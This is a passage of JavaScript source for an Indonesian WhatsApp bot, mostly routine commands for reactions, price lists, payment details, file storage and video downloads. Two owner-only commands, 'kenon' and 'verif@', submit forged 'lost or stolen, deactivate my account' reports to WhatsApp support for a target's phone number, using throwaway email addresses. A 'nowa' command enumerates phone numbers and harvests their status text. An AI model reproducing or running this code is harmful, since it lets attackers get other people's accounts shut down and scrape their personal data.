case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
haikal.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'jadian': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let menst = [orang, jodoh]
haikal.sendMessage(from, {image:thumb, caption:`Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`}, {mentions: menst})
}
break

//=================================================//
case "kenon": {
if (!isCreator) return m.reply('Kamu Mau ? :)')
if (Input) {
let cekno = await haikal.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return m.reply(`Tidak Bisa Verif My Creator!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes.. Nomor Telah Out!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan Nomor Target!')
}
break
case "verif@": {
if (!isCreator) return m.reply('Kamu Mau ? :)')
if (Input) {
let cekno = await haikal.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return m.reply(`Tidak Bisa Verif My Creator!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes.. Nomor Telah Out!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan Nomor Target!')
}
break
//=================================================//
case 'hwcap':{
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

*Mau Order WhatsApp ??*

🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
}
break
case 'skrop':{
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}

*Mau Order Skrip ??*

🇲🇨 *Hello My Name Hw Mods Bot`}, { quoted: m })
}
break
case 'bot': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
"description": ` - © ʜᴡ ᴍᴏᴅꜱ ᴡᴀ -

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIH LANJUT ✌️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ WE ARE NOT MASTOD`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'panel': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

*Pricelist Harga AmGeekz Panel* :

⚡PAKET G1
1GB RAM/1GB Disk/25% CPU
Rp10.000,00/1 BULAN
⚡PAKET G2
2GB RAM/2GB Disk/50% CPU
Rp15.000,00/1 BULAN
⚡PAKET G3
3GB RAM/3GB Disk/75% CPU
Rp20.000,00/1 BULAN
⚡PAKET G4
4GB RAM/4GB Disk/100% CPU
Rp25.000,00/1 BULAN
⚡PAKET G5
5GB RAM/5GB Disk/125% CPU
Rp30.000,00/1 BULAN
⚡PAKET G6
6GB RAM/6GB Disk/150% CPU
Rp35.000.00/1 BULAN
⚡PAKET G7
7GB RAM/7GB Disk/175% CPU
Rp40.000.00/1 BULAN

---------------------------------------
Pricelist Perpanjang Masa Aktif AmGeekz Panel :

⚡PAKET G1 = Rp5.000
⚡PAKET G2 = Rp7.500
⚡PAKET G3 = Rp10.000
⚡PAKET G4 = Rp12.500
⚡PAKET G5 = Rp15.000
⚡PAKET G6 = Rp17.500
⚡PAKET G7 = Rp20.000

Nb:
Melakukan top up saldo artinya anda setuju dengan segala kebijakan kami.
Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minimal selama 23hari.

*[ Administrator]*
contact.amgeekz.site
Admin1 = 6285649455626
Admin2 = 62895422836123
Admin3 = 6281214281312
`)
}
break
//=================================================//
case 'pdana': {
haikal.sendMessage(from, { image: dana,  caption: `DANA : 085714170944` }, { quoted:m })
}
break
case 'pgopay': {
haikal.sendMessage(from, { image: gopay,  caption: `GOPAY : 085714170944` }, { quoted:m })
}
break
case 'pbca': {
haikal.sendMessage(from, { image: rekening,  caption: `Rek BCA : 2832657396` }, { quoted:m })
}
break
//=================================================//

case 'tutorial': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`)
}
break
//=================================================//

//=================================================//
case 'infoamgeekz': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

📮 _*Syarat & Ketentuan*_

1. _Fitur lupa password sudah bisa digunakan jadi pastikan email aktif kalian sudah di tambahkan di panel kami._
2. _Selalu backup data_
3. _Jangan beritahukan user password kepada orang lain ( kami tidak bertanggung jawab dengan hal ini )_

_*sebelumnya kami mengalami kasus dimana user kami menjual akunnya ke orang lain dan selang beberapa hari meminta kami untuk reset password hal ini membuat nama panel kami dibilang scam untuk menanggulangi hal ini kami tidak akan lagi membantu melakukan reset password.*` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'redemcode': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `*CARA MASUKAN KODE REDDEM AMGEEKZ*
- _TEKAN ICON KOIN/SALDO DIATAS_
- _PILIH KODE REDDEM_
- _MASUKAN KODE YANG DI KIRIM ADMIN_
- _TEKAN REDDEM_

*CREATE SERVER DI AMGEEKZ PANEL*
- _TEKAN POJOK KIRI ATAS_
- _PILIH SERVER_
- _TEKAN CREATE SERVER_
- _MASUKAN NAMA_
- _SOFTWARE/GAMES : NODEJS_
- _SPECIFICATION : NODEJS_
- _NODE : PILIH SERVER YANG DI INGINKAN_
- _PILIH PAKET_
- _TEKAN MANAGE_` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break

//=================================================//
case 'bagaimanakah':
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//
case 'nowa': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('lah?')
m.reply('Sabar Cuy Loading')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'addpdf':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${q}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan query')
let teks = `${q}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
case 'listpdf': {
if (!isCreator) return m.reply(mess.owner)
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ʜᴡ ᴍᴏᴅꜱ ᴡᴀ + sambil reply pesan target* \n\n Contoh 2 : yopdf ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
m.reply(teksoooo)
}
break
case 'yopdf':{
if (!isCreator) return m.reply(mess.owner)
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break

case 'sendpdf': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'larangan': case 'peraturan': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot ʜᴡ ᴍᴏᴅꜱ ᴡᴀ
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': {
if (!welcmm) return
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
kicee = m.sender
await haikal.groupParticipantsUpdate(from, [kicee], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Toxic 」\n\n@${kicee.split("@")[0]} Telah dikick karena Telah Toxic di group ini`, contextInfo:{mentionedJid:[kicee]}}, {quoted:m})
}
break
case 'addzip':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama zip apa')
let teks = `${q}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${q}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
case 'listzip': {
if (!isCreator) return m.reply(mess.owner)
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ʜᴡ ᴍᴏᴅꜱ ᴡᴀ + sambil reply pesan target* \n\n Contoh 2 : yozip ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
m.reply(teksooooo)
}
break
case 'yozip':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendzip': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
case 'addapk':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama apk apa')
let teks = `${q}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${q}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
case 'listapk': {
if (!isCreator) return m.reply(mess.owner)
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ʜᴡ ᴍᴏᴅꜱ ᴡᴀ + sambil reply pesan target* \n\n Contoh 2 : yoapk ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
m.reply(teksoooooo)
}
break
case 'yoapk':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendapk': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(q)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
await fsx.copy(delb, `./database/Audio/${q}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
case 'delvn':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(q)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${q}.mp3`)
reply(`Sukses delete vn ${q}`)
}
break
case 'listvn':{
let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnye.length}*`
reply(teksooo)
}
break
case 'addmsg': {
                if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'sendlist': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                haikal.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
                m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                haikal.copyNForward(from, msgs[text.toLowerCase()], true)
            }
            break

//=================================================//
case 'assalamualaikum': case 'p': {
m.reply(`Waalaikumsalam`)
}
break
//=================================================//

case 'kalkulator': {
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break



//=================================================//
case "fbvideo": case "fbreels":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Link nya kak?\n\nContoh : .facebook https://www.facebook.com/reel/478437244198357')
m.reply('Sabar Cuy Loading')
let res = await facebook(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "igvideo": case "igreels":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Link nya kak?\n\nContoh : .instagram https://www.instagram.com/tv/CEjIHlnpyvI/?igshid=NTdlMDg3MTY=')
m.reply('Sabar Cuy Loading')
let res = await instagram(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "twitvideo":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
m.reply('Sabar Cuy Loading')
let res = await twitter(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
case "tiktokvideo":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "tiktokaudio":{
if (!isCreator) return m.reply(mess.owner)
if (!q) return reply (`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
let ghd = await haikal.sendMessage(from,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
// CASE UNTUK FITURE DOWNLOAD
case 'youtube': {
if (args.length < 2) return m.reply(`Kirim perintah ${command} query\nContoh : ${command} monokrom`)
m.reply('Sabar Cuy Loading')
await sendPlay(from, q)
}
break
case 'hw1': {
haikal.sendMessage(from, { image: hw1,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw2': {
haikal.sendMessage(from, { image: hw2,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw3': {
haikal.sendMessage(from, { image: hw3,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw4': {
haikal.sendMessage(from, { image: hw4,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw5': {
haikal.sendMessage(from, { image: hw5,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw6': {
haikal.sendMessage(from, { image: hw6,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw7': {
haikal.sendMessage(from, { image: hw7,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw8': {
haikal.sendMessage(from, { image: hw8,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw9': {
haikal.sendMessage(from, { image: hw9,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw10': {
haikal.sendMessage(from, { image: hw10,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw11': {
haikal.sendMessage(from, { image: hw11,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw12': {
haikal.sendMessage(from, { image: hw12,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw13': {
haikal.sendMessage(from, { image: hw13,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw14': {
haikal.sendMessage(from, { image: hw14,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw15': {
haikal.sendMessage(from, { image: hw15,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw16': {
haikal.sendMessage(from, { image: hw16,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw17': {
haikal.sendMessage(from, { image: hw17,  caption: `© Created By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ` }, { quoted:m })
}
break
case 'hw18': {
